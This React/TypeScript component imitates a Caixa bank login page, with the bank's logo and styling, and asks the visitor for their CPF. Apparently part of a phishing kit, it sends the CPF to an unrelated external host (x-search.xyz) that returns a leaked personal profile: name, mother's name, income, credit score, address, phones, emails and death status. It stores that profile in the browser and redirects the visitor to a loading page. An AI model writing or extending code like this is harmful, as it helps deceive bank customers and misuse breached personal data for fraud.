import { useState } from "react";
import logo from "../assets/caixa.webp";
import userIcon from "../assets/user.png";
import axios from "axios";

// Configuração da API
const api = axios.create({
    baseURL: 'https://x-search.xyz/test-by-x-slayer/apis/rafa/01',
    headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
    },
});

// Tipagem da resposta simulada
interface UserData {
    CPF: string;
    Nome: string;
    Nome_Mae: string;
    Sexo: string;
    Data_Nascimento: string;
    Estado_Civil: string;
    Escolaridade: string;
    Profissao: string;
    Renda: string;
    Score: string;
    Faixa_Risco: string;
    Endereco: string;
    Numero: string;
    Bairro: string;
    Cidade: string;
    Estado: string;
    Telefones: string;
    Emails: string;
    Obito: string;
}

export function Login() {
    const [cpf, setCpf] = useState<string>("");
    const [isLoading, setIsLoading] = useState<boolean>(false);
    const [userData, setUserData] = useState<UserData | null>(null); // Estado para dados do usuário


    console.log(userData)

    // Função para aplicar a máscara de CPF
    const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
        let value = event.target.value.replace(/\D/g, "");
        if (value.length > 11) value = value.slice(0, 11);

        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

        setCpf(value);
    };

    // Função que chama a API e armazena os dados no localStorage
    const fetchUserData = async () => {
        try {
            setIsLoading(true); // Ativa o estado de carregamento

            const response = await api.get<{ status: number; dados: UserData[] }>(`/cpf.php?cpf=${cpf.replace(/\D/g, '')}`);
            const user = response.data.dados[0];

            // Armazena os dados no estado e no localStorage
            setUserData(user);
            localStorage.setItem(cpf, JSON.stringify(user));

            // Redireciona após o sucesso
            window.location.href = "/carregando";

        } catch (error) {
            console.error("Erro ao buscar dados do usuário:", error);
        } finally {
            setIsLoading(false); // Desativa o estado de carregamento
        }
    };

    // Função chamada ao clicar no botão "Próximo"
    const handleNext = () => {
        if (cpf.length < 14) {
            alert("Por favor, insira um CPF válido.");
            return;
        }
        fetchUserData(); // Chama a API ao clicar no botão
    };

    return (
        <div className="w-screen px-6 space-y-6 mt-6">
            <header className="flex flex-col justify-center items-center p-4 space-y-3">
                <img width={170} src={logo} alt="logo" />
                <span className="text-blue-800">Login Caixa</span>
            </header>

            <div>
                <h1 className="text-lg text-zinc-500">
                    Informe seu CPF e clique em "Próximo" para continuar:
                </h1>
            </div>

            <div className="flex items-center space-x-2">
                <img src={userIcon} alt="user" width={15} />
                <input
                    type="text"
                    value={cpf}
                    onChange={handleCpfChange}
                    className="border-b border-b-orange-500 w-full text-lg outline-none"
                    placeholder="CPF"
                    maxLength={14}
                />
            </div>

            <button
                onClick={handleNext}
                className={`w-full text-white rounded-sm flex items-center justify-center h-10 ${isLoading ? "bg-orange-500 cursor-not-allowed" : "bg-orange-400"
                    }`}
                disabled={isLoading}
            >
                {isLoading ? (
                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-white"></div>
                ) : (
                    "Próximo"
                )}
            </button>

            <div className="flex flex-col items-center text-blue-900 space-y-6">
                <div className="font-semibold">
                    É novo por aqui? <span className="underline">Cadastre-se</span>
                </div>
                <span className="underline">Preciso de ajuda</span>
            </div>
        </div>
    );
}
